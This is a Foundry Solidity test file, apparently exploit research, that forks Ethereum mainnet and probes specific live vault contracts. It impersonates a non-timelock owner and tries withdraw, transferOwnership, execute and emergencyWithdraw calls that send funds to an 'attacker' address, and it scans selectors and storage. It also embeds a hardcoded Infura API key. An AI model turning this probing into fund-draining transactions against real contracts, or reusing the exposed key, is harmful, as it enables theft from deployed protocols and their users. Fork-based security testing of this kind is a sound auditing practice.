// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * NON-TIMELOCK OWNER EXPLOIT
 *
 * CRITICAL FINDING: VAULT.slot2 (0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a)
 * is owned by 0x22261B4D6F629D8cF946C3524df86bF7222901F6 - NOT the Timelock!
 *
 * This could be an EOA or a contract with weaker access control.
 */
contract NonTimelockOwnerExploit is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Contract with non-Timelock owner
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant NON_TIMELOCK_OWNER = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;

    // R1 additional contracts
    address constant R1_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant R1_SLOT5 = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeNonTimelockOwner() public {
        console.log("=== ANALYZE NON-TIMELOCK OWNER ===\n");

        console.log("Target owner:", NON_TIMELOCK_OWNER);
        console.log("Code size:", NON_TIMELOCK_OWNER.code.length);

        if (NON_TIMELOCK_OWNER.code.length == 0) {
            console.log("*** OWNER IS AN EOA! ***");
            console.log("If this EOA's private key is compromised, attacker gains control!");
        } else {
            console.log("Owner is a contract");

            // Analyze owner's storage
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(NON_TIMELOCK_OWNER, bytes32(i));
                if (uint256(slot) != 0) {
                    console.log("Owner slot %d:", i);
                    console.logBytes32(slot);
                }
            }

            // Check owner's owner
            (bool s1, bytes memory d1) = NON_TIMELOCK_OWNER.staticcall(abi.encodeWithSignature("owner()"));
            if (s1 && d1.length > 0) {
                console.log("Owner's owner:", abi.decode(d1, (address)));
            }
        }
    }

    function test_ExploitVaultSlot2ViaOwner() public {
        console.log("=== EXPLOIT VAULT_SLOT2 VIA OWNER ===\n");

        // What if we impersonate the owner?
        console.log("Impersonating owner:", NON_TIMELOCK_OWNER);

        vm.startPrank(NON_TIMELOCK_OWNER);

        // Try admin functions
        (bool s1,) = VAULT_SLOT2.call(abi.encodeWithSignature("setVault(address)", attacker));
        console.log("setVault(attacker):", s1);

        (bool s2,) = VAULT_SLOT2.call(abi.encodeWithSignature("withdraw(uint256,address)", type(uint256).max, attacker));
        console.log("withdraw(max, attacker):", s2);

        (bool s3,) = VAULT_SLOT2.call(abi.encodeWithSignature("transferOwnership(address)", attacker));
        console.log("transferOwnership(attacker):", s3);

        (bool s4,) = VAULT_SLOT2.call(abi.encodeWithSignature("execute(address,uint256,bytes)", VAULT, 0, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18)));
        console.log("execute(VAULT, transfer):", s4);

        (bool s5,) = VAULT_SLOT2.call(abi.encodeWithSignature("emergencyWithdraw(address)", attacker));
        console.log("emergencyWithdraw:", s5);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AnalyzeR1Contracts() public {
        console.log("=== ANALYZE R1 ADDITIONAL CONTRACTS ===\n");

        // R1.slot4
        console.log("R1.slot4:", R1_SLOT4);
        console.log("  Code size:", R1_SLOT4.code.length);

        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(R1_SLOT4, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("  Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        (bool s1, bytes memory d1) = R1_SLOT4.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length > 0) {
            console.log("  Owner:", abi.decode(d1, (address)));
        }

        // R1.slot5
        console.log("\nR1.slot5:", R1_SLOT5);
        console.log("  Code size:", R1_SLOT5.code.length);

        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(R1_SLOT5, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("  Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        (bool s2, bytes memory d2) = R1_SLOT5.staticcall(abi.encodeWithSignature("owner()"));
        if (s2 && d2.length > 0) {
            console.log("  Owner:", abi.decode(d2, (address)));
        }
    }

    function test_VaultSlot2FunctionsScan() public {
        console.log("=== VAULT_SLOT2 FUNCTIONS SCAN ===\n");

        address target = VAULT_SLOT2;

        // Scan all function selectors
        bytes4[] memory sigs = new bytes4[](30);
        sigs[0] = bytes4(keccak256("owner()"));
        sigs[1] = bytes4(keccak256("admin()"));
        sigs[2] = bytes4(keccak256("paused()"));
        sigs[3] = bytes4(keccak256("vault()"));
        sigs[4] = bytes4(keccak256("asset()"));
        sigs[5] = bytes4(keccak256("pendingOwner()"));
        sigs[6] = bytes4(keccak256("getRate()"));
        sigs[7] = bytes4(keccak256("rate()"));
        sigs[8] = bytes4(keccak256("price()"));
        sigs[9] = bytes4(keccak256("exchangeRate()"));
        sigs[10] = bytes4(keccak256("totalAssets()"));
        sigs[11] = bytes4(keccak256("totalSupply()"));
        sigs[12] = bytes4(keccak256("balanceOf(address)"));
        sigs[13] = bytes4(keccak256("allowance(address,address)"));
        sigs[14] = bytes4(keccak256("controller()"));
        sigs[15] = bytes4(keccak256("redemption()"));
        sigs[16] = bytes4(keccak256("strategy()"));
        sigs[17] = bytes4(keccak256("oracle()"));
        sigs[18] = bytes4(keccak256("underlying()"));
        sigs[19] = bytes4(keccak256("token()"));
        sigs[20] = bytes4(keccak256("name()"));
        sigs[21] = bytes4(keccak256("symbol()"));
        sigs[22] = bytes4(keccak256("decimals()"));
        sigs[23] = bytes4(keccak256("version()"));
        sigs[24] = bytes4(keccak256("MAX_VALUE()"));
        sigs[25] = bytes4(keccak256("MIN_VALUE()"));
        sigs[26] = bytes4(keccak256("delay()"));
        sigs[27] = bytes4(keccak256("cooldown()"));
        sigs[28] = bytes4(keccak256("minimum()"));
        sigs[29] = bytes4(keccak256("maximum()"));

        console.log("View functions that work:");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSelector(sigs[i]));
            if (s && d.length > 0) {
                console.log("Selector %d:", i);
                console.logBytes4(sigs[i]);
            }
        }
    }

    function test_ImpersonateOwnerAllContracts() public {
        console.log("=== IMPERSONATE OWNER ALL CONTRACTS ===\n");

        // Impersonate NON_TIMELOCK_OWNER and try all vault-related contracts
        vm.startPrank(NON_TIMELOCK_OWNER);

        // Try on VAULT directly
        console.log("Trying VAULT...");
        (bool v1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("  withdraw:", v1);

        // Try on VAULT_SLOT2
        console.log("Trying VAULT_SLOT2...");
        (bool s1,) = VAULT_SLOT2.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("  withdraw:", s1);

        // Try different patterns
        (bool s2,) = VAULT_SLOT2.call(abi.encodeWithSignature("claim()"));
        console.log("  claim:", s2);

        (bool s3,) = VAULT_SLOT2.call(abi.encodeWithSignature("harvest()"));
        console.log("  harvest:", s3);

        (bool s4,) = VAULT_SLOT2.call(abi.encodeWithSignature("collect()"));
        console.log("  collect:", s4);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_CheckOwnerEthBalance() public {
        console.log("=== CHECK OWNER ETH BALANCE ===\n");

        // If owner is an EOA, check if it has ETH (might be active)
        uint256 ownerEth = NON_TIMELOCK_OWNER.balance;
        console.log("Owner ETH balance:", ownerEth / 1e18, "ETH");

        // Check if owner has any transactions
        // (can't check directly in Solidity, but non-zero balance suggests activity)

        if (ownerEth > 0) {
            console.log("Owner has ETH - likely active EOA");
        }

        // Check owner's TASSET/wstETH balance
        uint256 ownerTasset = IERC20(TASSET).balanceOf(NON_TIMELOCK_OWNER);
        uint256 ownerWstETH = IERC20(wstETH).balanceOf(NON_TIMELOCK_OWNER);

        console.log("Owner TASSET:", ownerTasset / 1e18);
        console.log("Owner wstETH:", ownerWstETH / 1e18);
    }
}
